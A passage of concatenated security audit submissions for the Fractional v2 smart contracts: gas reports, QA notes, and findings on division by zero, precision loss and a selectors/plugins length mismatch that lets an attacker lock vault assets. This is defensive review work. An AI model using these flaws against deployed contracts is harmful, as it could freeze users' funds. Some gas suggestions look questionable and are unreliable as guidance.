(totalSupply + tokenBalance);     +    _sendEthOrWeth(msg.sender, buyoutShare);     +    // Emits event for cashing out of buyout pool     +    emit Cash(_vault, msg.sender, buyoutShare);     + }     ``` * In `sellFractions()` function in [Buyout.sol#L112](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L112)      ```diff     + unchecked {      +    uint256 endTime = startTime + PROPOSAL_PERIOD;     +    if (block.timestamp > endTime)     +        revert TimeExpired(block.timestamp, endTime);         + }  * In `buyFractions()` function in [Buyout.sol#L149](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L149)      ```diff     + unchecked {      +    uint256 endTime = startTime + REJECTION_PERIOD;     +    if (block.timestamp > endTime)     +        revert TimeExpired(block.timestamp, endTime);     + }     ```  * In `end()` function in [Buyout.sol#L184](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L184)      ```diff     + unchecked {      +    uint256 endTime = startTime + REJECTION_PERIOD;     +    if (block.timestamp <= endTime)     +        revert TimeNotElapsed(block.timestamp, endTime);     +     +    uint256 tokenBalance = IERC1155(token).balanceOf(address(this), id);     +    // Checks totalSupply of auction pool to determine if buyout is successful or not     +    if (     +        (tokenBalance * 1000) /     +            IVaultRegistry(registry).totalSupply(_vault) >     +        500     +    ) {     +        // Initializes vault transaction     +        bytes memory data = abi.encodeCall(     +            ISupply.burn,     +            (address(this), tokenBalance)     +        );     +        // Executes burn of fractional tokens from pool     +        IVault(payable(_vault)).execute(supply, data, _burnProof);     +        // Sets buyout state to successful     +        buyoutInfo[_vault].state = State.SUCCESS;     +        // Emits event for ending successful auction     +        emit End(_vault, State.SUCCESS, proposer);     +    } else {     +        // Deletes auction info     +        delete buyoutInfo[_vault];     +        // Transfers fractions and ether back to proposer of the buyout pool     +        IERC1155(token).safeTransferFrom(     +            address(this),     +            proposer,     +            id,     +            tokenBalance,     +            ""     +        );     +        _sendEthOrWeth(proposer, ethBalance);     +        // Emits event for ending unsuccessful auction     +        emit End(_vault, State.INACTIVE, proposer);     + }     ```  * In the `proposal()` function in [Migration.sol#L72](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L72)      ```diff     + unchecked {     +    Proposal storage proposal = migrationInfo[_vault][++nextId];     +    proposal.startTime = block.timestamp;     +    proposal.targetPrice = _targetPrice;     +    proposal.modules = _modules;     +    proposal.plugins = _plugins;     +    proposal.selectors = _selectors;     +    proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(     +        _vault     +    );     +    proposal.newFractionSupply = _newFractionSupply;         + }     ```  ### 10. Using `a = a + b` instead of `a += b` for state variables saves gas * In [Migration.sol#L123](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L123)    ```diff    - proposal.totalEth += msg.value;   + proposal.totalEth = proposal.totalEth + msg.value;       ```  * In [Migration.sol#L134](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L134)   ```diff    - proposal.totalFractions += msg.value;   + proposal.totalFractions = proposal.totalFractions + msg.value;     ```  ### 11. Looking up array length from memory every time in a loop costs more gas.  *  In [Buyout.sol#L454](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L454)     ```diff     - for (uint256 i; i < permissions.length; ) {     + uint256 length;         + for (uint256 i; i < length; ) {     ``` 
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Migration.sol#L202 https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Migration.sol#L528   # Vulnerability details  ## Impact When `proposal.totalFractions` is equal to the total supply (meaning that all token holders want to participate in a migration), there is a division by zero in `_calculateTotal`.  In contrast to a buyout, where it does not make sense to initiate a buyout if all tokens are held (because there is a dedicated method for that), it does make sense to have a migration that all token holders join. Therefore, this case should be handled.  ## Proof Of Concept ```diff --- a/test/Migration.t.sol +++ b/test/Migration.t.sol @@ -238,7 +238,7 @@ contract MigrationTest is TestUtil {          // Bob joins the proposal          bob.migrationModule.join{value: 1 ether}(vault, 1, HALF_SUPPLY);          // Alice joins the proposal -        alice.migrationModule.join{value: 1 ether}(vault, 1, 1000); +        alice.migrationModule.join{value: 1 ether}(vault, 1, HALF_SUPPLY);           vm.warp(proposalPeriod + 1);          // bob calls commit to kickoff the buyout process ```  ## Recommended Mitigation Steps In such a case, `redeem` can be used instead of starting a buyout.  
- For a migration, shouldn't it be sufficient if the currentPrice is greater than or equal to the target price? (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Migration.sol#L206) At least that is what I would imagine after reading the documentation ("If the target price is reached then a buyout can be triggered") - For the buyout, the documentation does not match the implementation. In the documentation (https://docs.fractional.art/fractional-v2-1/smart-contracts/modules/buyout), it is mentioned that "If a pool has more than 51% of the total supply after 4 days, ...". However, 51% are not needed, the buyout actually suceeds with 50.1% in the implementation (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Buyout.sol#L211) - For `FERC1155`, once a signature was given to someone, there is no way to cancel the permission, which can be undesirable. Consider adding a cancel method to the contract (that stores the cancelled signatures). - For `FERC1155`, when a user gives out multiple signatures (to different accounts at the same time), only the first redeem call will succeed (because of the nonce). If the user wants to avoid that and increases the nonces himself (e.g., nonce 1 for user A, nonce 2 for user B), user A has to use the signature before user B, which is undesirable. Consider optimizing the nonce management, e.g. storing all the used nonces (instead of requiring sequential ones). - Because of malleable signatures, it is considered best practice to check for invalid `s` and `v` values, as OpenZeppelin is doing: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/5e007871991e4f04e871bf5fb1200668ff16b35f/contracts/utils/cryptography/ECDSA.sol#L142 In `FERC1155.sol`, `ecrecover` is called without these checks. - In `setApprovalFor` (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/FERC1155.sol#L191), only a boolean can be provided. This can be very undesirable for an ERC1155 token where a user might also want to specify an amount for the allowance. Consequently, the approvals are not decreased or reset in `safeTransferFrom`. - `ERC1155` inherits `safeBatchTransferFrom` from Solmate (https://github.com/Rari-Capital/solmate/blob/main/src/tokens/ERC1155.sol#L78), but `isApproved` is not checked in this function, meaning that someone who got the approval for all the provided ids still cannot call `safeBatchTransferFrom`. Consider also overriding this function and adding the check that all ids are approved as an alternative. - In `ERC1155`, it is possible to set arbitrarily high royalties (even >100%), which does not make sense and leads to wrong values in `royaltyInfo`. Consider adding a limit. - In `ERC1155`, although the royalty is a `uint256` value, the actual granularity for the calculation is very small and only whole percent values can be provided (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/FERC1155.sol#L247). Consider increasing the granularity, e.g. dividing by 10,000. - In `_execute` of `Vault`, returning `success` (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/Vault.sol#L117) is not necessary. The execution will always revert when it was not successful, i.e. there is no way that `sucess` can be false. - `BaseVault` hardcodes the number of hashes to 6 (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/protoforms/BaseVault.sol#L128), which seems to be the number when modules contains `BaseVault` and `BuyoutModule`. However, depending on the modules that are passed, the number of hashes can be greater. Therefore, the array size should be dynamic. - It seems strange to me that there is no authentication for plugins, whereas the whole Merkle Tree authentication system exists for modules. Therefore, if an owner would (accidentally) add a module as a plugin, everyone could call it and the whole module authentication would be circumvented. This also contradicts the sentence "An NFT within a given Vault cannot be withdrawn unless its modules allow for it." in the documentation. An owner can simply add a new plugin and withdraw all tokens (meaning there is a lot of trust in the owner). - There is currently no way to transfer airdrops (e.g., ERC20 tokens that are distributed to all holders of a NFT) out of a `Vault` without starting a migration. Consider adding a module that would allow to transfer them. - The WETH address (https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/utils/SafeSend.sol#L12) is hardcoded, which can make testing and deploying on other networks more difficult. Consider making the address configurable. - In the documentation, it is mentioned "These modules are set by the curator upon fractionalization and can be adjusted via governance vote of token holders.". However, this does not seem to be true. An owner can always set a new merkle root (via `setMerkleRoot`) which allows new modules. - An attacker could call `createInCollection` with some malicious tokens that he created (conforming to the FERC1155 calls) and therefore create a vault with a malicous, worthless tokens. He could then sell those tokens and for normal users it would appear as if they are normal fractionalization tokens of a vault. - It seems strange to me to have a functionality (`createInCollection`) for creating a new vault with an existing token. This could result in some scenarios that are undesired. For example, when a buyout is active for both vaults, there is an arbitrage opportunity (buy the tokens with the lower price, sell the ones with the higher) and the person that initiated the one with the lower price will not succeed, although it might have (because people would have been willing to sell at this price) when only vault with this token had existed. 
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L72-L99   # Vulnerability details  # Vulnerability details  ## Impact Precision loss causing loss of user value and potentially cause complete loss to vault  ## Proof of Concept https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L471-L472  If the supply of the fraction is set to say 10 then any user that uses migrateFractions with less than 10% of the contributions will receive no shares at all due to precision loss. Under certain conditions it may even cause complete loss of access to the vault. In this same example, if less than 5 fractions can be redeemed (i.e. not enough people have more than 10% to overcome the precision loss) then the vault would never be able to be bought out and the vault would forever be frozen.  ## Tools Used  ## Recommended Mitigation Steps When calling propose require that _newFractionSupply is greater than some value (i.e. 1E18)  
# 2022-07-fractional ## Gas Optimisations Report  ### FUNCTIONS GUARANTEED TO REVERT WHEN CALLED BY NORMAL USERS CAN BE MARKED PAYABLE If a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are `CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost  _There are **9** instances of this issue:_  ```solidity File: /src/Vault.sol  24:    function init() external { 25:         if (nonce != 0) revert Initialized(owner, msg.sender, nonce);   73:    function install(bytes4[] memory _selectors, address[] memory _plugins) 74:        external 75:    { 76:        if (owner != msg.sender) revert NotOwner(owner, msg.sender);   86:    function setMerkleRoot(bytes32 _rootHash) external { 87:        if (owner != msg.sender) revert NotOwner(owner, msg.sender);   93:    function transferOwnership(address _newOwner) external { 94:        if (owner != msg.sender) revert NotOwner(owner, msg.sender);   101:   function uninstall(bytes4[] memory _selectors) external { 102:       if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L24  ```solidity File: /src/FERC1155.sol  198:   function setContractURI(string calldata _uri) external onlyController {  205:   function setMetadata(address _metadata, uint256 _id) 206:       external 207:       onlyController   217:   function setRoyalties( 218:       uint256 _id, 219:       address _receiver, 220:       uint256 _percentage 221:   ) external onlyController {   229:   function transferController(address _newController) 230:       external 231:       onlyController ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#L198  ### `PUBLIC` FUNCTIONS NOT CALLED BY THE CONTRACT SHOULD BE DECLARED `EXTERNAL` INSTEAD Contracts are allowed to override their parents’ functions and change the visibility from `external` to `public` and can save gas by doing so.  _There are **8** instances of this issue:_  ```solidity File: /src/FERC1155.sol  256:   function safeTransferFrom( 257:       address _from, 258:       address _to, 259:       uint256 _id, 260:       uint256 _amount, 261:       bytes memory _data 262:   ) public override(ERC1155, IFERC1155) {   291:   function uri(uint256 _id) 292:       public 293:       view 294:       override(ERC1155, IFERC1155) 295:       returns (string memory) ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#L256-L262  ```solidity File: /src/utils/MerkleBase.sol  43:    function verifyProof( 44:        bytes32 _root, 45:        bytes32[] memory _proof, 46:        bytes32 _valueToProve 47:    ) public pure returns (bool) {   61:    function getRoot(bytes32[] memory _data) public pure returns (bytes32) {   73:    function getProof(bytes32[] memory _data, uint256 _node) 74:        public 75:        pure 76:        returns (bytes32[] memory) ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L43-L47  ```solidity File: /src/utils/Metadata.sol  36:    function uri(uint256 _id) public view returns (string memory) { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/Metadata.sol#L36  ```solidity File: /src/utils/SelfPermit.sol  18:    function selfPermit( 19:        address _token, 20:        uint256 _id, 21:        bool _approved, 22:        uint256 _deadline, 23:        uint8 _v, 24:        bytes32 _r, 25:        bytes32 _s 26:    ) public {   46:    function selfPermitAll( 47:        address _token, 48:        bool _approved, 49:        uint256 _deadline, 50:        uint8 _v, 51:        bytes32 _r, 52:        bytes32 _s 53:    ) public { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/SelfPermit.sol#L18-L26  ### \<ARRAY>.LENGTH SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A FOR-LOOP The overheads outlined below are PER LOOP, excluding the first loop - storage arrays incur a Gwarmaccess (100 gas) - memory arrays use `MLOAD` (3 gas) - calldata arrays use `CALLDATALOAD` (3 gas) \ \ Caching the length changes each of these to a `DUP<N>` (3 gas), and gets rid of the extra DUP<N> needed to store the stack offset  _There are **8** instances of this issue:_    ```solidity File: /src/modules/Buyout.sol  454:   for (uint256 i; i < permissions.length; ) { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L454  ```solidity File: /src/modules/protoforms/BaseVault.sol  64:    for (uint256 i = 0; i < _tokens.length; ) {  83:    for (uint256 i = 0; i < _tokens.length; ) {  107:   for (uint256 i = 0; i < _tokens.length; ++i) {  130:   for (uint256 i; i < _modules.length; ++i) {  132:   for (uint256 j; j < leaves.length; ++j) { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/protoforms/BaseVault.sol#L64  ```solidity File: /src/utils/MerkleBase.sol  51:    for (uint256 i = 0; i < _proof.length; ++i) {  110:   for (uint256 i; i < result.length; ++i) { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L51    ### USING > 0 COSTS MORE GAS THAN != 0 WHEN USED ON A UINT This change saves 6 gas per comparison  _There is **1** instance of this issue:_    ```solidity File: /src/utils/MerkleBase.sol  186:    while (x > 0) { ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L186  ### RETURN DIRECTLY INSTEAD OF STORING A RETURN MEMORY VARIABLE  _There are **5** instances of this issue:_    ```solidity File: /src/Vault.sol  53:    ) external payable returns (bool success, bytes memory response) {            ... 67:        (success, response) = _execute(_target, _data); ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L53    ```solidity File: /src/Vault.sol  55:    ) external returns (address vault) { 56:        vault = _deployVault(_merkleRoot, address(fNFT), _plugins, _selectors);     87:    ) external returns (address vault, address token) { 88:        (vault, token) = createCollectionFor(       107:   ) external returns (address vault) {            ... 111:       vault = _deployVault(_merkleRoot, _token, _plugins, _selectors);  ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/VaultRegistry.sol#L55-L56    ```solidity File: /src/Vault.sol  181:   returns (bool started)            ... 212:       started = true; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L181     ### EXPRESSIONS FOR CONSTANT VALUES SUCH AS A CALL TO `KECCAK256()`, SHOULD USE `IMMUTABLE` RATHER THAN `CONSTANT` It is expected that the value should be converted into a constant value at compile time. But actually the expression is re-calculated each time the constant is referenced.    _There are **3** instances of this issue:_    ```solidity File: /src/constants/Permit.sol  5:     bytes32 constant DOMAIN_TYPEHASH = keccak256( 6:         "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)" 7:     );     10:    bytes32 constant PERMIT_TYPEHASH = keccak256( 11:        "Permit(address owner,address operator,uint256 tokenId,bool approved,uint256 nonce,uint256 deadline)" 12:    );     15:    bytes32 constant PERMIT_ALL_TYPEHASH = keccak256( 16:        "PermitAll(address owner,address operator,bool approved,uint256 nonce,uint256 deadline)" 17:    ); ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/constants/Permit.sol#L5  ### Replace `x <= y` with `x < y + 1` In the EVM, there is no opcode for `>=` or `<=`. When using less than or equal, two operations are performed: `<` and `=`. Using strict comparison operators hence saves gas    _There is **1** instance of this issue:_    ```solidity File: /src/modules/Buyout.sol  203:   if (block.timestamp <= endTime) ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L203                                       ### STATE VARIABLES ONLY SET IN THE CONSTRUCTOR SHOULD BE DECLARED `IMMUTABLE` Avoids a Gsset (20000 gas)  _There are **8** instances of this issue:_  ```solidity File: /src/VaultFactory.sol  15:    address public implementation; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/VaultFactory.sol#L15    ```solidity File: /src/modules/Buyout.sol  29:    address public registry;                                       31:    address public supply;                                       33:    address public transfer; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L29                                      ```solidity File: /src/modules/Migration.sol  37:    address payable public buyout;                                       39:    address public registry; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L37    ```solidity File: /src/modules/Minter.sol  14:    address public supply; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Minter.sol#L14                                       ```solidity File: /src/modules/protoforms/BaseVault.sol  19:    address public registry; ``` https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/protoforms/BaseVault.sol#L19   ### `X += Y`/`X -= Y` COSTS MORE GAS THAN `X = X + Y`/`X = X - Y`                                       _There are **15** instances of this issue:_                                    ```solidity File: /src/FERC1155.sol  62:    totalSupply[_id] -= _amount;  86:    totalSupply[_id] += _amount;  270:   balanceOf[_from][_id] -= _amount;  271:   balanceOf[_to][_id] += _amount; ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#L62                                  ```solidity File: /src/modules/Buyout.sol  139:   buyoutInfo[_vault].ethBalance -= ethAmount;  176:   buyoutInfo[_vault].ethBalance += msg.value; ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L139                              ```solidity File: /src/modules/Migration.sol  123:   proposal.totalEth += msg.value;  124:   userProposalEth[_proposalId][msg.sender] += msg.value;  134:   proposal.totalFractions += _amount;  135:   userProposalFractions[_proposalId][msg.sender] += _amount;  156:   proposal.totalFractions -= amount;  160:   proposal.totalEth -= ethAmount;  497:   treeLength += IModule(_modules[i]).getLeafNodes().length; ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L123                         ```solidity File: /src/utils/MerkleBase.sol  147:   for (uint256 i; i < length - 1; i += 2) {  190:   ceil -= pOf2; // see above ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L147     ### DEFAULT VALUE INITIALIZATION If a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.    _There are **6** instances of this issue:_    ```solidity File: /src/Vault.sol  78:    for (uint256 i = 0; i < length; i++) {  104:   for (uint256 i = 0; i < length; i++) { ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L78    ```solidity File: /src/modules/protoforms/BaseVault.sol  64:    for (uint256 i = 0; i < _tokens.length; ) {  83:    for (uint256 i = 0; i < _tokens.length; ) {    107:   for (uint256 i = 0; i < _tokens.length; ++i) { ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/protoforms/BaseVault.sol#L64    ```solidity File: /src/utils/MerkleBase.sol  51:    for (uint256 i = 0; i < _proof.length; ++i) { ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L51  ### MULTIPLICATION/DIVISION BY TWO SHOULD USE BIT SHIFTING `x * 2` is equivalent to `x << 1` and `x / 2` is the same as `x >> 1`. The `MUL` and `DIV` opcodes cost 5 gas, whereas `SHL` and `SHR` only cost 3 gas  _There are **3** instances of this issue:_    ```solidity File: /src/utils/MerkleBase.sol  100:   _node = _node / 2;  136:   result = new bytes32[](length / 2 + 1);    142:   result = new bytes32[](length / 2); ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L100  ### `REQUIRE()`/`REVERT()` STRINGS LONGER THAN 32 BYTES COST EXTRA GAS    _There are **2** instances of this issue:_    ```solidity File: /src/utils/MerkleBase.sol  62:    require(_data.length > 1, "wont generate root for single leaf");  78:    require(_data.length > 1, "wont generate proof for single leaf"); ```                               Use shorter error string message.    https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L62    ### USE CUSTOM ERRORS RATHER THAN REVERT()/REQUIRE() STRINGS Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met) while providing the same amount of information  _There are **5** instances of this issue:_    ```solidity File: /src/FERC1155.sol  263:   require( 264:       msg.sender == _from || 265:           isApprovedForAll[_from][msg.sender] || 266:           isApproved[_from][msg.sender][_id], 267:       "NOT_AUTHORIZED" 268:   );     275:   require( 276:       _to.code.length == 0 277:           ? _to != address(0) 278:           : INFTReceiver(_to).onERC1155Received( 279:               msg.sender, 280:               _from, 281:               _id, 282:               _amount, 283:               _data 284:           ) == INFTReceiver.onERC1155Received.selector, 285:       "UNSAFE_RECIPIENT" 286:   );      297:   require(metadata[_id] != address(0), "NO METADATA"); ```                               https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#L263    ```solidity File: /src/utils/MerkleBase.sol  62:    require(_data.length > 1, "wont generate root for single leaf");  78:    require(_data.length > 1, "wont generate proof for single leaf"); ```    https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L62  ### `INTERNAL` and `PRIVATE` FUNCTIONS ONLY CALLED ONCE CAN BE INLINED TO SAVE GAS Not inlining costs 20 to 40 gas because of two extra `JUMP` instructions and additional stack operations needed for function calls.    _There are **4** instances of this issue:_    ```solidity File: /src/Vault.sol    142:   function _revertedWithReason(bytes memory _response) internal pure { ```    https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L137    ```solidity File: /src/utils/Multicall.sol    39:    function _revertedWithReason(bytes memory _response) internal pure { ```    https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/Multicall.sol#L25    ```solidity File: /src/utils/Multicall.sol    324:   function _computePermitStructHash(    350:   function _computePermitAllStructHash( ```    https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/Multicall.sol#L113 https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/Multicall.sol#L159  ### USING `PRIVATE`/`INTERNAL` RATHER THAN `PUBLIC` FOR `CONSTANT`S SAVES GAS If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table      _There are **6** instances of this issue:_  ```solidity File: /src/FERC1155.sol    15:    string public constant NAME = "FERC1155";    17:    string public constant VERSION = "1"; ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#324  ```solidity File: /src/modules/Buyout.sol    35:    uint256 public constant PROPOSAL_PERIOD = 2 days;    37:    uint256 public constant REJECTION_PERIOD = 4 days; ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L35  ```solidity File: /src/modules/Migration.sol    43:    uint256 public constant PROPOSAL_PERIOD = 7 days; ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L43  ```solidity File: /src/utils/SafeSend.sol    11:    address payable public constant WETH_ADDRESS = 12:        payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/SafeSend.sol#L11-L12     ### USE LITERAL ARRAYS INSTEAD OF CREATING AN ARRAY WITH SINGLE ITEM    _There are **2** instances of this issue:_    ```solidity File: /src/modules/Minter.sol    - 24:    function getLeafNodes() external view returns (bytes32[] memory nodes) { - 25:        nodes = new bytes32[](1); - 26:        nodes[0] = keccak256(abi.encode(getPermissions()[0])); - 27:    }    + 24:    function getLeafNodes() external view returns (bytes32[] memory) { + 25:        return [keccak256(abi.encode(getPermissions()[0]))]; + 26:    } ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Minter.sol#L25    ```solidity File: /src/modules/Minter.sol  - 32:    function getPermissions() - 33:        public - 34:        view - 35:        returns (Permission[] memory permissions) - 36:    { - 37:        permissions = new Permission[](1); - 38:        permissions[0] = Permission( - 39:            address(this), - 40:            supply, - 41:            ISupply.mint.selector - 42:        ); - 43:    }    + 32:    function getPermissions() public view returns (Permission[] memory) { + 33:        return [Permission(address(this), supply, ISupply.mint.selector)]; + 34:    } ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Minter.sol#L37  ### PREFIX INCREMENTS ARE CHEAPER THAN POSTFIX INCREMENTS `++I` costs less gas than `I++`, especially when it's used in for-loops (`--I`/`I--` too). Saves 6 gas per instance    _There are **3** instances of this issue:_    ```solidity File: /src/Vault.sol    78:    for (uint256 i = 0; i < length; i++) {                                       104:   for (uint256 i = 0; i < length; i++) { ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L78    ```solidity File: /src/utils/MerkleBase.sol    188:   ceil++; ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L188  ### ++I/I++ SHOULD BE UNCHECKED{++I}/UNCHECKED{I++} WHEN IT IS NOT POSSIBLE FOR THEM TO OVERFLOW, AS IS THE CASE WHEN USED IN FOR- AND WHILE-LOOPS The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves 30-40 gas **per loop**    _There are **2** instances of this issue:_    ```solidity File: /src/Vault.sol    78:    for (uint256 i = 0; i < length; i++) {                                        104:   for (uint256 i = 0; i < length; i++) { ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L78 
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73-L82 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L72-L99 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L174   # Vulnerability details  ## Impact In `propose()` in Migration.sol, there is no check that the lengths of the `selectors` and `plugins` arrays are the same. This means that if a migration is successful, the `install()` function in Vault.sol could revert beacuse we access an array out of bounds. This prevents a new vault being created thereby permanently locking assets inside the vault.  ## Proof of Concept 1. user starts a new migration proposal where `selectors.length != plugins.length` 2. enough users join proposal and the buyout bid starts 3. buyout bid is successful and migration starts with `settleVault()` 4. a new vault is cloned with `create()` -> `registry.deployFor()` -> `vault.install(selectors, plugins)` 5. a. If `selectors.length > plugins.length` then we get an out of bounds error and transaction reverts     b. If `selectors.length < plugins.length` then the excess values in `plugins` is ignored which is tolerable 6. In scenario a., the migration fails and a new migration cannot start so assets in the vault are permanently locked  This may seem quite circumstantial as this problem only occurs if a user specifies `selectors` and `plugins` wrongly however it is very easy for an attacker to perform this maliciously with no cost on their behalf, it is highly unlikely that users will be able to spot a malicious migration.  ## Tools Used VS Code ## Recommended Mitigation Steps Consider adding a check in `propose()` to make sure that the lengths match i.e. ```solidity function propose(         address _vault,         address[] calldata _modules,         address[] calldata _plugins,         bytes4[] calldata _selectors,         uint256 _newFractionSupply,         uint256 _targetPrice     ) external {         // @Audit Make sure that selectors and plugins match         require(_selectors.length == _plugins.length, "Plugin lengths do not match");         // Reverts if address is not a registered vault         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);         if (id == 0) revert NotVault(_vault);         // Reverts if buyout state is not inactive         (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);         State required = State.INACTIVE;         if (current != required) revert IBuyout.InvalidState(required, current);          // Initializes migration proposal info         Proposal storage proposal = migrationInfo[_vault][++nextId];         proposal.startTime = block.timestamp;         proposal.targetPrice = _targetPrice;         proposal.modules = _modules;         proposal.plugins = _plugins;         proposal.selectors = _selectors;         proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(             _vault         );         proposal.newFractionSupply = _newFractionSupply;     } ```  Additionally, I would suggest adding such a check in the `install()` function as this may prevent similiar problems if new modules are added  
